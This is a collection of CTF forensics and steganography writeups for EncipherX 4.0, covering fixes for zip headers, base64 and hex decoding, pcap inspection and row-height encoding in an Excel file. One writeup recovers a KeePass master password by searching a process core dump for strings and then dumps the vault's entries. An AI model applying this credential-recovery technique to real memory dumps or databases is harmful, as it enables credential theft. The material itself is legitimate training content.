# EncipherX 4.0 - Writeups by 3ll10t_5nd3rs0n (Team FS0CI3TY)

---
## 1. 4G3N7$ 

## Challenge Description
**Title:** 4G3N7$  
**Description:** Two agents were asked to hide the same secret inside a transmission. One was careless. One understood how data survives change. You are given the transmission files. Not every answer you find should be trusted.

## Solution

### 1. Initial Reconnaissance
I started by analyzing the provided file, `transmission.png`. A common first step in steganography/forensics challenges is to check for plaintext strings hidden within the binary data.

### 2. Metadata Analysis
Using a string search script (or standard tools like `strings` or `exiftool`), I inspected the file content.
I discovered a suspicious string in the PNG `tEXt` chunk (metadata comments):

```
PHX{l0g1c_w4s_w0nd3rful_4g3n8}
```

### 3. Logic and Deduction
The prompt gives us two crucial clues:
1.  "One was careless" vs "One understood how data survives change".
2.  "Not every answer you find should be trusted."

The flag found in the metadata (`...4g3n8`) maybe represents the "careless" agent (Agent 8) who left the secret in plain sight. However, the challenge title is **4G3N7** (Agent 7).

Since the prompt states they possess the *same* secret, and Agent 7 is the one implied to be smart/correct (matching the challenge title), I deduce that the valid flag must correspond to Agent 7.

Replacing the agent identifier in the careless flag gives us the correct flag.

## Final Flag
```
PHX{l0g1c_w4s_w0nd3rful_4g3n7}
```

---
---
## 2. The professors prank

## Challenge Description
**Title:** The professors prank   
**Description:** The Professor left a package designed to frustrate. It involves a recursive structure where you must peel back layers to find the solution.

## Solution Methodology

### 1. Initial Analysis
The challenge provided a file named `professorsGambit.zip`.I first attempt to unzip it using standard tools resulted in an error indicating a "corrupt local file header."

Inspecting the file signature (magic bytes) revealed the issue:
```python
# First 4 bytes found
b'XX\x03\x04' 
```
Standard Zip files typically start with `PK\x03\x04`. The 'XX' was a clear corruption intended to break standard unzip tools.

### 2. The recursive "Matryoshka" Structure
After fixing the header of the initial file (replacing `XX` with `PK`), extracting it revealed two files:
1. `locked_file.zip` (Password protected)
2. `final_image.jpg`

The `final_image.jpg` was not actually an image, but another zip file with the same corrupted header (`XX...`). This pattern repeated for 51 levels. Each level contained a file named `levelX.jpg` which was actually a corrupted zip file needing the header fix.

### 3. Automation
A Python script was written to:
1.  Read the current file.
2.  Detect and fix the corrupt header (`XX` -> `PK`).
3.  Extract the contents.
4.  Identify the next nested file and repeat.

```
// The Complete Solve Script :
import zipfile
import os
import shutil

def fix_header(filename):
    """
    Reads the file, checks for the 'XX' magic byte corruption,
    replaces it with 'PK', and writes it back.
    """
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        
        # Check for the specific corruption mentioned in the writeup
        if data.startswith(b'XX\x03\x04'):
            print(f"[*] Fixing header for {filename}")
            new_data = b'PK\x03\x04' + data[4:]
            with open(filename, 'wb') as f:
                f.write(new_data)
            return True
        elif data.startswith(b'PK\x03\x04'):
            # Header is valid
            return True
        else:
            # Maybe it's not a zip, or different corruption.
            # But for this challenge, I assume it's either XX or PK if it's the target file.
            return False
    except Exception as e:
        print(f"[!] Error fixing header for {filename}: {e}")
        return False

def check_for_flag(base_dir, password):
    """
    Checks if the 'locked_file.zip' is present (from layer 0) and tries to open it
    with the recovered password.
    """
    # logic: layer_0 extraction should separate locked_file.zip and final_image.jpg
    # The extraction happened into solution_output/layer_0
    
    layer_0_dir = os.path.join(base_dir, "layer_0")
    locked_file_path = os.path.join(layer_0_dir, "locked_file.zip")
    
    if os.path.exists(locked_file_path):
        print(f"[*] Attempting to unlock {locked_file_path} with password: {password}")
        try:
            with zipfile.ZipFile(locked_file_path, 'r') as z:
                z.extractall(base_dir, pwd=password.strip().encode())
            
            flag_path = os.path.join(base_dir, "flag.txt")
            if os.path.exists(flag_path):
                with open(flag_path, 'r') as f:
                    print(f"\n[SUCCESS] Flag found: {f.read().strip()}")
                return True
        except Exception as e:
            print(f"[!] Failed to unlock: {e}")
    else:
        print(f"[!] locked_file.zip not found at {locked_file_path}")
    
    return False

def solve():
    base_dir = "solution_output"
    if os.path.exists(base_dir):
        shutil.rmtree(base_dir)
    os.makedirs(base_dir)

    # Initial file
    original_zip = "professorsGambit.zip"
    if not os.path.exists(original_zip):
        print(f"[!] {original_zip} not found.")
        return

    # I start with the original zip.
    # To handle the recursive 'current file' logic, I copy it to a working path.
    current_work_zip = os.path.join(base_dir, "current.zip")
    shutil.copy(original_zip, current_work_zip)
    
    iteration = 0
    password = None

    while True:
        # 1. Fix Header
        if not fix_header(current_work_zip):
             # If fixing header fails or returns False (not XX/PK), check if it is the text file
             try:
                with open(current_work_zip, 'rb') as f:
                    content = f.read(100)
                    # If it's small and text-like
                    if b'P@ssw0rd' in content or b'passkey' in content.lower() or len(content) < 100:
                         # This might be the passkey file itself if logic drifted, 
                         # but usually I extract `passkey.txt`.
                         # Let's rely on extraction.
                         pass
             except:
                 pass

        # 2. Extract
        extract_dir = os.path.join(base_dir, f"layer_{iteration}")
        if not os.path.exists(extract_dir):
            os.makedirs(extract_dir)

        try:
            with zipfile.ZipFile(current_work_zip, 'r') as z:
                z.extractall(extract_dir)
            
            files = os.listdir(extract_dir)
            print(f"Iteration {iteration}: Extracted {files}")
            
            # 3. Identify Next Step
            
            # Check for passkey
            passkey_candidates = [f for f in files if "passkey" in f or f.endswith(".txt")]
            # Filter standard txts if any? assume unique names for now.
            for p_cand in passkey_candidates:
                # I expect "passkey.txt"
                if p_cand == "passkey.txt":
                    with open(os.path.join(extract_dir, p_cand), 'r') as pf:
                        password = pf.read().strip()
                    print(f"[*] FOUND PASSWORD: {password}")
                    break
            
            if password:
                break

            # Find next zip (usually .jpg)
            # In layer 0: final_image.jpg
            # In layers 1+: levelX.jpg
            next_zip_candidates = [f for f in files if f.endswith(".jpg")]
            
            if next_zip_candidates:
                # Take the first one found
                next_zip_name = next_zip_candidates[0]
                next_zip_path = os.path.join(extract_dir, next_zip_name)
                
                # Prepare for next iteration
                current_work_zip = next_zip_path
                iteration += 1
            else:
                print("[!] No next zip found and no password found. Stopping.")
                break

        except zipfile.BadZipFile:
            print(f"[!] Bad zip file at iteration {iteration}")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    # 4. Unlock if password found
    if password:
        check_for_flag(base_dir, password)

if __name__ == "__main__":
    solve()

```

### 4. finding the Key
After 51 iterations, the recursion stopped at `layer_51`. Instead of another "image," the script extracted a file named `passkey.txt` containing the text:
`P@ssw0rd_Fr0m_L3v3l_51`

## Final Flag
This password was used to unlock the `locked_file.zip` found in the *very first* layer. This yielded `flag.txt`.

## Final Flag:

```
PHX{th1s_pl@n_c@nn0t_f@il}
```

---
---
## 3. Professor's Encrypted Drive

## Challenge Description
**Title:** Professor's Encrypted Drive   
**Challenge:** Uncover the hidden message from the Professor's encrypted drive.

## 1. Initial Analysis
I started with a file named `professor_drive.img`. Despite the `.img` extension, which suggests a disk image, I needed to verify the actual file type.

Using the `file` command in WSL:
```bash
file professor_drive.img
Output: professor_drive.img: 7-zip archive data, version 0.4
```
The file was identified as a **7-Zip archive**.

## 2. Extraction
Attempts to list or extract the archive contents revealed it was password-protected.
```bash
7z l professor_drive.img
Error: Can not open encrypted archive. Wrong password?
```

Using the password provided for the challenge (`HeistMaster`), I successfully accessed the archive:
```bash
7z x -pHeistMaster professor_drive.img
```

This extracted a folder named `professor_drive` containing the following text files:
- `logs.txt`
- `notes.txt`
- `report.txt`
- `secret.txt`

## 3. Investigation
I examined the content of the extracted files.

**secret.txt:**
```
Money Heist Forever
```

**notes.txt:**
```
To-do list for the next mission...
Update CCTV firmware
Prepare blueprints
Contact Berlin
```

**report.txt:**
```
Meeting summary: Discussing the Royal Mint operations...
```

**logs.txt:**
```
Backup of CCTV logs. Nothing suspicious here.
# Metadata: UEhYe3Byb2Zlc3Nvcl9rbm93c19ob3dfdG9faGlkZV9kYXRhfQo=
```

The file `logs.txt` contained a suspicious "Metadata" comment with a random-looking string.

## 4. Decoding
The string `UEhYe3Byb2Zlc3Nvcl9rbm93c19ob3dfdG9faGlkZV9kYXRhfQo=` appeared to be **Base64** encoded (alphanumeric characters ending with an `=` padding).

Decoding the string:
```bash
echo "UEhYe3Byb2Zlc3Nvcl9rbm93c19ob3dfdG9faGlkZV9kYXRhfQo=" | base64 -d
```

**Output:**
```
PHX{professor_knows_how_to_hide_data}
```

## Final Flag
`PHX{professor_knows_how_to_hide_data}`

---
---
## 4. Capture the Hidden

## Challenge Description
**Title:** Capture the Hidden   
**Description:** During the heist, Tokyo secretly exfiltrated data from the network. The traffic was erased — but a PCAP file was recovered. Somewhere inside the packets, a hidden message was sent out.

## Analysis
The challenge provides a single file: `mint_traffic.pcap`.

### Initial Reconnaissance
I started by analyzing the distribution of protocols in the capture file.
- **Protocols found:** DNS, ICMP, TCP (HTTP).
- **DNS:** Queries for `google.com`.
- **ICMP:** Generic ping requests (Type 8).
- **TCP:** HTTP GET and POST requests towards `mint-internal.net`.

### Packet Inspection
I inspected the payloads of the TCP packets to see the HTTP traffic. 
Most traffic consisted of `GET /index.html` requests. However, one packet stood out as a `POST` request.

**Packet Details:**
```http
POST /upload HTTP/1.1
Host: mint-internal.net
User-Agent: Mozilla/5.0
Content-Length: 45

data=UEhYe1AwNXRfMXNfdjNyeV8zNDV5X1QwX0YxTkR9
```

The `data` parameter contained a suspicious string: `UEhYe1AwNXRfMXNfdjNyeV8zNDV5X1QwX0YxTkR9`.

### Decryption
The string appeared to be Base64 encoded. Decoding it revealed the flag.

```python
import base64
print(base64.b64decode('UEhYe1AwNXRfMXNfdjNyeV8zNDV5X1QwX0YxTkR9').decode())
Output: PHX{P05t_1s_v3ry_345y_T0_F1ND}
```

## Solution
1. Open the `mint_traffic.pcap` file.
2. Filter for HTTP POST requests or look for data exfiltration patterns.
3. Locate the POST request to `/upload`.
4. Extract the base64 string from the POST body.
5. Decode the string to get the flag.

## Final Flag
`PHX{P05t_1s_v3ry_345y_T0_F1ND}`

---
---
## 5. Berlin's Flashback 

## Challenge Description

**Title:** Berlin's Flashback   
**Description:** The server is dead, but the memory remains. I have the lock and the ghost of the key.
Recover the credentials from the dump and access the system. The target file is classified, and the current logs show nothing of value. You must dig deeper than what is visible to the naked eye to find the flag.

---

## Files

From `Challenge.zip`:

- `Bunker-Crash.core` — ELF x86_64 core dump (crashed `mono` process)
- `Bunker.kdbx` — KeePass KDBX database

The hint “server is dead, but the memory remains” points at the core dump as the source of the key material.

---

## Approach

### 1) Identify the artifacts

Unzip and check file types:

  - `file -b Bunker-Crash.core`
  - `file -b Bunker.kdbx`

This confirms I have a memory dump and an encrypted password database.

---

### 2) Extract likely credentials from the dump

KeePass (and GUI apps generally) often store user-entered text as UTF-16LE in process memory.
So the fastest win is scanning the core dump for strings.

Example searches (WSL):

- ASCII strings:
  - `strings -a -n 6 Bunker-Crash.core | grep -Eai 'keepass|kdbx|master|pass|key|credential' | head`
- UTF-16LE strings (important):
  - `strings -el -n 4 Bunker-Crash.core | grep -Eai 'keepass|kdbx|master|pass|key|bunker' | head`

From the UTF-16LE strings output, a strong candidate master password appears:

- `encipherx_t34ch_y0u`

---

### 3) Open the KeePass DB using the recovered password

Use a KeePass parser (Python `pykeepass`) to open the database.


- Open and enumerate:

```bash
python3 - <<'PY'
from pykeepass import PyKeePass

kp = PyKeePass('Bunker.kdbx', password='encipherx_t34ch_y0u')
for e in kp.entries:
    print('title:', e.title)
    print('username:', e.username)
    print('password:', e.password)
    print('notes:', e.notes)
    print('---')
PY
# Output : 
# title: flag_artifact
# username: Scanner_Unit
# password: 5048587b6d336d3072795f63616e6e6f745f62655f63306e74316e753075737d
# notes: 48 65 6c 6c 6f 20 57 6f 72 6c 64
---
```

This reveals an entry containing the flag material (in this challenge it shows up as a hex string in a field).

---

### 4) Decode the final flag

The extracted value is hex-encoded. Decode it:

```bash
python3 - <<'PY'
import binascii
hexs = '5048587b6d336d3072795f63616e6e6f745f62655f63306e74316e753075737d'
print(binascii.unhexlify(hexs).decode())
PY
# Output : PHX{m3m0ry_cannot_be_c0nt1nu0us}
```


## Final Flag  :

PHX{m3m0ry_cannot_be_c0nt1nu0us}

---
---

## 6. The Stubborn Governor 

## Challenge Description
**Title:** The Stubborn Governor   
**Description:** The Governor is protecting his secrets with a digital temper tantrum. The moment you touch his book, it self-destructs. And even if you stop the explosion, he’s used a cheap magic trick to make the most important parts invisible. You have to fix the book's attitude and then look for what’s hiding in plain site.

### 1. Analysis
The challenge provided a file named `Book1.xlsm`. The extension `.xlsm` indicates an Excel Macro-Enabled Workbook. The description warned that opening the book causes it to "self-destruct" (close or delete content via VBA macros) and that the important parts are "invisible".

To bypass the malicious VBA macros, I performed **static analysis** rather than opening the file in Excel. Since modern Office files (DOCX, XLSX, XLSM) are just ZIP archives containing XML data, I was able to unpack them to inspect the raw data.

### 2. Extraction & Inspection
I extracted the contents of the file:
```bash
unzip Book1.xlsm -d extracted
```

I examined the folder structure. The core data for Excel sheets is typically located in `xl/worksheets/`. I inspected `extracted/xl/worksheets/sheet1.xml`.

### 3. Discovery
Inside `sheet1.xml`, I observed a list of rows with specific `ht` (height) attributes. This stood out because the row heights varied significantly and looked like they might represent data rather than formatting.

Sample of the XML:
```xml
<row r="1" ht="79.95" ... />
<row r="2" ht="72" ... />
<row r="3" ht="88.05" ... />
```

### 4. Decoding
I hypothesized that the row heights corresponded to ASCII character codes.
- Row 1: `79.95` $\approx$ 80 $\rightarrow$ `P`
- Row 2: `72.00` $\rightarrow$ 72 $\rightarrow$ `H`
- Row 3: `88.05` $\approx$ 88 $\rightarrow$ `X`

The pattern matched the flag format. I wrote a script to parse the XML, extract the `ht` attribute for every row, round it to the nearest integer, and convert it to a character.

### 5. Solution Script
The following Python script was used to solve the challenge:

```python
import xml.etree.ElementTree as ET

# Parse the worksheet XML
tree = ET.parse('extracted/xl/worksheets/sheet1.xml')
root = tree.getroot()

rows = []

# Iterate through the sheetData to find rows with height attributes
for child in root:
    if child.tag.endswith('sheetData'):
        for row in child:
            if 'ht' in row.attrib:
                # Store tuple of (row_number, row_height)
                rows.append((int(row.attrib['r']), float(row.attrib['ht'])))

# Sort by row number to ensure correct order
rows.sort()

# Decode: Round height -> Integer -> ASCII Char
flag = ""
for r, ht in rows:
    flag += chr(int(round(ht)))

print(f"Flag: {flag}")
```

### 6. Verification
Running the script produced the flag.

**Flag:** `PHX{fin@lly_c0rrupted_s3*t_g0t_you_s0mething}`

## Final Flag

PHX{fin@lly_c0rrupted_s3*t_g0t_you_s0mething}

---
---

## 7. Palermo's Mess

## Challenge Description
**Title:** Palermo's Mess   
**Description:** Palermo sent the plan, but it looks like he put it through a blender first just to be dramatic. It looks like total garbage. It’s a chaotic puzzle with pieces that don't seem to fit. You have to be as crazy as he is to find the logic in this mess and make the pieces talk to each other.

## Solution Steps

### 1. File Identification and Extraction
The initial file provided was `palermos.pdf`. Analyzing the file signature (magic bytes) revealed it was actually a ZIP archive (starting with `PK...`).
- **Action**: Renamed `palermos.pdf` to `palermos.zip`.
- **Action**: Extracted the contents, which revealed:
    - `document.pdf`
    - `fragment.jpeg`
    - `log.txt`
    - `vault.zip` (Password protected)

### 2. Gathering Clues
I examined each file for clues to construct the password for `vault.zip`.

#### `log.txt`
- Contained the hint: `title_author_secrect`.
- This suggested the password format was a combination of a Title, an Author, and a Secret string.
- It also contained a decoy base64 string (a YouTube link to "Never Gonna Give You Up").

#### `document.pdf`
- Standard metadata (Title/Author) contained decoys ("Keep Looking...", "This is not the answer").
- **Hidden Clue**: inspecting the raw bytes (strings) of the PDF revealed hidden custom properties:
    - `PDF_CLUE_T::(Q2FiYWxsbyBkZSBUcm95YWg=)` -> Decodes to **Caballo de Troyah** (Title)
    - `PDF_CLUE_A::(TWlndWUgQW1vZWRv)` -> Decodes to **Migue Amoedo** (Author)

#### `fragment.jpeg`
- Using the `strings` command method on the image revealed a hidden string at the end of the file:
    - `SECRET_IS::[yeh_toh_apna_raju_hai_re_baba]`
    - The secret component is **yeh_toh_apna_raju_hai_re_baba**.

### 3. Password Construction
Combining the pieces using the format `title_author_secrect` from the log file.
Given the nature of the strings (multi-word title/author), underscores were used as separators, and spaces within the names were also replaced with underscores.

- **Title**: Caballo de Troyah -> `Caballo_de_Troyah`
- **Author**: Migue Amoedo -> `Migue_Amoedo`
- **Secret**: `yeh_toh_apna_raju_hai_re_baba`

**Final Password**: `Caballo_de_Troyah_Migue_Amoedo_yeh_toh_apna_raju_hai_re_baba`

### 4. Retrieving the Flag
Using the constructed password, we successfully unlocked `vault.zip`.
- **Contents**: `flag.txt`
- **Flag**: `PHX{hehe_y0u_r3bu1ld_4nyth1ng}`

## Final Flag

PHX{hehe_y0u_r3bu1ld_4nyth1ng}

---
---

## 8. The Mint's Buffer

## Challenge Description
**Title:** The Mint's Buffer   
**Description:** The police are outside the mint. We need to get the evidence out, but we can't send standard files—their firewalls block all image headers.

We decided to send the data 'naked'.The image width was set to match the payout of a slot machine. If you align the bytes correctly, the chaos will turn into order.

Align the stream. Find the message. Bella Ciao

## Solution Analysis

### 1. Initial Reconnaissance
The file comes without a standard header (like PNG, JPG, BMP). The description suggests it's "naked" data, likely raw pixel data (Raw Bitmap).

Checking the file size:
```
File size: 2332000 bytes
```

### 2. Identifying File Structure
Since it's raw image data, the file size is the product of:
`Width * Height * Channels`

Common channels are:
- RGB (3 bytes per pixel)
- RGBA (4 bytes per pixel)

Testing divisibility:
- `2332000 % 3 = 1` (Not RGB)
- `2332000 % 4 = 0` (Likely RGBA)

Total pixels = `2332000 / 4 = 583000` pixels.

### 3. Finding the Width (The "Chaos to Order" Step)
An incorrect width wraps the pixel data incorrectly, creating visual noise (static). The correct width aligns the vertical structures (lines, text, edges) of the image.

I can mathematically determind the correct width by finding the dimensions that minimize the **vertical pixel variance**. In a proper image, pixel `(x, y)` is likely similar color to `(x, y+1)`. In a misaligned image, they are uncorrelated.

I collected all factors of `583000` (the pixel count) to test as potential widths.

I wrote a script (`solver.py`) to test widths between 100 and 5000:
1. Reshape the raw bytes into a NumPy array of shape `(Height, Width, 4)`.
2. Convert to grayscale.
3. Calculate the average difference between adjacent rows.
4. The width with the **lowest** difference score is the correct specific dimension.

**Result**:
Width **583** yielded the lowest score (2.19), significantly better than others.

### 4. Extracting the Flag
With the width determined as **583**, we rendered the raw data. Since we are in a terminal environment, we converted the pixel values to ASCII characters based on intensity:
- Dark pixels (<50) -> `@` (or similar dense char)
- Light pixels (>200) -> ` ` (space)

Running the solver revealed the text embedded in the image.

```
Solver.py : 
import numpy as np
import os

def score_width(data, width):
    """
    Calculates a score for a given width based on vertical pixel coherence.
    Lower score means less "chaos" (adjacent vertical pixels are similar).
    """
    pixel_size = 4 # RGBA
    stride = width * pixel_size
    height = len(data) // stride
    
    # Create array from bytes
    arr = np.frombuffer(data, dtype=np.uint8)
    
    # Reshape and convert to grayscale for analysis
    try:
        img = arr.reshape((height, width, 4))
        # Simple grayscale: average of RGB
        gray = np.mean(img[:, :, :3], axis=2)
        
        # Calculate vertical difference: |row[i] - row[i-1]|
        diff = np.abs(gray[:-1, :] - gray[1:, :])
        score = np.mean(diff)
        return score
    except ValueError:
        return float('inf')

def solve():
    file_path = "evidence.bin"
    if not os.path.exists(file_path):
        print("evidence.bin not found.")
        return

    with open(file_path, "rb") as f:
        data = f.read()

    file_size = len(data)
    print(f"[+] File Size: {file_size} bytes")

    # Step 1: Find potential widths (factors of size/4 since it's likely RGBA)
    # The prompt hinted "image width was set to match the payout of a slot machine". 
    # But we solved it by brute-forcing alignment.
    
    total_pixels = file_size // 4
    factors = []
    for i in range(1, int(total_pixels**0.5) + 1):
        if total_pixels % i == 0:
            factors.append(i)
            factors.append(total_pixels // i)
    
    # Filter for reasonable widths
    possible_widths = sorted([f for f in factors if 100 <= f <= 5000])
    
    print(f"[+] Testing {len(possible_widths)} possible widths...")
    
    best_width = 0
    best_score = float('inf')
    
    for w in possible_widths:
        if w == 0: continue
        s = score_width(data, w)
        if s < best_score:
            best_score = s
            best_width = w
            
    print(f"[+] Found best width alignment: {best_width} pixels (Score: {best_score:.4f})")
    
    # Step 2: Render the image with the correct width
    print("[+] Rendering ASCII art...")
    
    width = best_width
    stride = width * 4
    height = len(data) // stride
    arr = np.frombuffer(data, dtype=np.uint8)
    img = arr.reshape((height, width, 4))
    
    # Grayscale
    gray = 0.299 * img[:, :, 0] + 0.587 * img[:, :, 1] + 0.114 * img[:, :, 2]
    
    # Print a slice where the text likely is.
    # We dump the whole thing to a file usually, but here we just print to stdout
    # Downsampling specific for console viewing
    
    output = []
    # Adjust step size based on width to fit in a typical terminal (~100-150 chars)
    step_col = max(1, width // 100)
    step_row = 2 # Vertical correction for font aspect ratio
    
    for r in range(0, height, step_row):
        line = ""
        for c in range(0, width, step_col):
            if c >= width: break
            val = gray[r, c]
            # Dark text on light background or vice versa? 
            # Output showed empty space as " ", which was high value?
            # Let's map low values (dark) to characters
            if val < 50: line += "@"
            elif val < 100: line += "%"
            elif val < 150: line += ":"
            elif val < 200: line += "."
            else: line += " "
        output.append(line)
        
    # Filter empty lines to keep output clean
    clean_output = [line for line in output if line.strip()]
    
    print("\n" + "="*50)
    print("\n".join(clean_output))
    print("="*50)

if __name__ == "__main__":
    solve()
```

```bash
python solver.py
```

**Output:** ( was almost visible through naked eyes )
```

```                                                                                                                                     
                                                                                                              ::..                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                 .                      .:.:%.::                       .                   .%.%%.:                                                                                                                     ..                                                                                                                                                                                                                                                                          .:%          .:                                                                     
                          .:.:%.:%.::.               .:.%%.%%.%%.                  .:.:%.:                 :%.%%.:                                                                    .. ..                                           .%.                                                                                              . ..                                                                                                                                                                       :.%%.         :%                                                                     
                       .:.%%.%%.%%.%%.::          .:.%%.%%.%%.%%.      .         ..:%.%%.%:               .%%.%%.:                                                               ..:%.%%.%%..                                         %%.            .:.::                                                                         .:.:%.%%.:%.                                                                                                                                                                  :%.%%.       ..%%.                                                                    
                     :.:%.%%.%%.%%.%%.%%.       ..:%.%%.%%.%%.%%.      ::       :%.%%.%%.%:     :.        .%%.:%..                                                              :%.%%.%%.%%.%%                                      :.%%..          .%%.%%.                                                                       .:%.%%.%%.%%..                                                                                                                                                                 :%.%%       :%.%%.                                                                    
                    :%.%%.%%.%%.%%.%%.%%..     :%.%%.%%.%%.:%.%%.     .%%     :.%%.%%.%%.%:    :%..      ..%%..                      .:.                                      ..%%.%%.%%.%%.%%.                                    :%.%%..        .%.%%.%%..                                                                    .%.%%.%%.%%.%%.%:                                                          :%                                                                                                   .%%.%:      .%%.%%.                                                                    
                   .%%.%%.%%.%%.%%.%%.%%.:.  :.%%.%%.%%.%%..:.%%.    ..%%    :%.%%.%%.%%.%:    %%.       :.%%.                      :.%%                                     .%.%%.%%.%%.%%.%%.                                   .%%.%%..        :%.%%.%%.:.                                                                   :%.%%.%%.%%.%%.%%                                                         .%%.                                                                                                 ..%%.:      :.%%.%%.                                                                    
                  :.%%.%%.%%.%%.%%.%%.%%.%% :%.%%.%%.%%...   .%%.    %.%:   .%%.%%.%%.%%.%:   .%%.       :.%%.                     .%.%%                                     :%.%%.%%.%%.:%.%%.                                  :.%%.%%..       .%%.%%.%%.%%                                                                  .%%.%%.%%.:%.%%.%%.                                                       ..%%.                                                                                                 %.%%..     :%.%%.%%.                                                                    
                  %.%%.%%.%%.%%.%%.%%.%%.%%.%%.%%.%%.:.      .%%.   :%.:. .%.%%.%%.%%.%%.%.  :.%%.       %.%%.                     :%.%:                                     :%.%%.:: .   ..%%..                                :%.:%.%%.       %.%%.%%.:%.%%                                                                  .%%.%%...    .:.%%.                                                       :.%%.                                                                                                .%.%%.      %%.:%.%%.                                                                    
                 .%.%%.%%.%%.:%.::.:%.%%.%%.%%.%%.::        ..%%    %%..  :%.%%.%%....%%.:. .%.%%        %.%%.                     %%.%.                                     %%.%%          :%..                                %%..%.%%.      :%.%%.:%. ..%%                                                                  .%%.:.         .%%.                                                      .%.%%                                                                                        :%.      :%.%%.     .:% :%.%%                                                                     
                 :%.%%.%%... :%.    . :%.%%.%%.%%.          %.%%   .%%.   %%.%%.::   .%%.:. :%.%:        %.%%.                     %%.:        ..                            :%.%%.         :%..                                :: .%.%%.      %%.%%.::   .%%                                                                  .%%.::         .%%.                                                      :%.%%                                                                                       .%%.      %%.%%      ..  %%.%%                                                                     
                 %%.%%...    :%.       ..%%.%%.:.          :%.:.  ..%%.  .%%.%%..    .%%.:. %%..         %.%%.                    .%%..      ..%%                            .%.%%.         %%.                                    :%.%%.     .%%.%%.     .%%                                                                   %%.%%        ..%%                                                       %%.%:                                                 .:                                   :.%%.     .%%.%:         .%%.%:                                                                     
                 %%.:.      .%%.        .%%.%%.::          %%.:   :.%%  ..%%.%:      .%%.::.%%.          %.%%.                   ..%%.       %.%%.                            ...:        ..%%.                                    %%.%%     :.%%.%:      .%%                                                                   .:...       .%.%%                                                       %%.:                                                :.%%.                                 .%.%%     :.%%.:          .%%.:.                                                                     
                .%%.        .%%         .%%.%%.:.         .%%.   .%.%:  %.%%..       .%%.:%.%%           %.%%.                   %.%%.      .%.%%.                                       .%.%%.                                    %%.%%    .%.%%..       .%%                                                                              .:%.%:                                                      .%%..                                               .%.%%                                  :%.%:    .%.%%.          ..%%.:                                                                      
                 .         :.%:         .%%.%%.          ..%%.   :%.:  .%.%%..       .%%.%%.:.           %.%%.                  .%.%%       :%.%%                                     .:.%%.%%                         ..         .%%.%.    :%.%%.        .%%                                                                            .%.%%.:         .             ..                             ..%%.                                                :%.%%                              .:%.%%.%%.   :%.%%.          %.%%..                                                                      
                          .%.:          .%%.:.          .%.%%    %%.   .%.%%.:.      .%%.%%..            %.%%.                  :%.%%       .%.%:                                  .:.:%.%%.:.                         :%.       ..%%.:     %%.%%        ..%%                                                                         .:.%%.%%.         :%.           .%%                             :.%%.                                               .%%.:.                             :.%%.%%.%%.   %%.%%          .%.%%.         .%.:.                                                         
                          :%.          ..%%.            :%.:.   .%%.   :%.%%.        .%%.%%.             %.%%.                  :%.:.        :..                                .:.:%.%%.%%.                          .%%.       :.%%..    .%%.%:        :.%%                                                                    . :%.%%.%%.::          %%.          ..%%.                           .%.%%                                     .:.       ..%%..                             .%.%%.%%.%%.  .%%.%:          :%.%%.         :%.:.                                                         
                          %%.          :.%%             %%.    :.%%    :%...         .%%.%%              %.%%.                  %%..         .                               .%.%%.%%.%%...                 .        ..%%.      .%.%%.    ..%%.:.        %.%:                                                                   :%.%%.%%.:%.           .%%..         :.%%.         .:.:%           . :%.%:                                     :%.       %.%%.                              :%.%%.%%.%%  ..%%.:           :%.%%.         :%.:.                                                         
                         .%%          .%.%%           ..%%.   .%.%:     :            .%%.%:              %.%%.            .:.:%.%%.       ..:%                               :%.%%.:%...                   :%.       :.%%.      :%.%%.    :.%%..        .%.%.           :.:                                    .               .%%.%%.::               .%%..        .%.%%.         :%.%%.       ..:%.:%.:.                            :%.:.   .%%.      .%.%%    ..                         %%.%%.%%.%:  %.%%..   .       %%.%%          %%.%:                                                         
                        :.%%..        :%.%:           %.%%    :%.::                  .%%.:              .%.%%.            :%.%%.%%.      .%.%%.      ..    .%.:.    :%       %%.%%.::              ..    ..%%.      .%.%%.      :%.%%.   .%.%%.         :%.:.    .:    :%.:.                                  :%.     .:      ..%%.%%..               :.%%.:        :%.%%.       :.%%.%%.      .%.%%.%%..                            .%%.%:  :.%%.      :%.%: .:.%%                        .%%.%%.%%.:  :%.%%.   :%.     .%%.%%         .%%.%:                                                         
                       .%.%%.:.      .%%.:           :%.%%.:%.%%.%%.::               .%%.:              .%.%%           :.%%.%%.%%.      :%.%%      .:%.   %%.%%   .%%.      %%.%%.:%...          :%.:  .%.%%.      :%.%%..     %%.%%.   :%.%%.         %%.:   ..%%.  .%%.%:                         .%.::  ..%%..   :.%:     :.%%.%%.:%.            .%.%%.:.       %%.%%.      :%.%%.%%.     .%%.%%.%%.                            ..%%.:. .%.%%.      %%.:  :%.%%                        .::.%%.:%.   :%.%%  ..%%..    .%%.%:        :.%%.%%                                                         
                     ..:%.:%..     .:.%%..           %%.%%.%%.%%.%%.%%              ..%%.:              :%.%%          :%.%%.%%.%%      .%%.%%     %.%%. ..%%.%:  :.%%.     .%%.%%.%%.%%.         %%.:  %%.%%.     .%%.%%..     %%.%%    :%.%%         .%%..  .%.%%. :.%%.%:                         :%.%% .%.%%..  :%.%:     :.%%.%%.%%.::          :%.%%.:.      .%%.%%.      %%.::.%%.   .%.%%.%%.%%.                            %.%%..  :%.%%      .:%....%%.%%                            %%. .    %%.%: .%.%%..   ..%%.:        .%.%%.%%                                                         
                    :%.%%..        :%.%%.      .:.:%.%%.%%.%%.%%.%%.%:             .%.%%..              :%.%:         .%%.%%.:%.%:     ..%%.%:    :%.%%..%.%%.%. :%.%%.     .%%.%%.%%.%%..      ..%%....%%.%%.    ..::.%%..    .%%.%%    :%.%%         .%%.   :%.%% :%.%%.:.                         %%.:. :%.%%.   %%.%%     %.%%.%%.%%.%%.        .%%.%%.%.     :.:%.%%.    ..%%. ..%%.   :%.%%.:%.%%.                           :%.%%.   %%.%:     :.:%..%.%%.%%                           .%%.     .%%.:  %%.%%.    :.%%.:        :%.:%.%%                                                         
                   .%%.%%.      .%.%%.%%     ..:%.%%.%%.%%.%%.%%.%%.:              :%.%%..            ..%%.:.        :.%%.%%.:%.:.     %.%%.:     %%.%: :%.%%.:  %%.%%.      .. .. .:.%%.%.     :.%%..%.%%.%%    .%.:..%%..    .%%.%.    %%.%.        :.%%.   %%.:..%%.%%..                        ..%%.. .%%.%%. ..%%.%:     .... .. .:.%%.       ..%:.%%.:.    :%..:.%%.    %.%%. :.%%   .%%.%%..:.%%                            :%.%%.  .%%.:.    .%.:%.:%.%%.%:                          :.%%     ..%%. ..%%.%%.    %.%%..       .%%.:%.%%                                                         
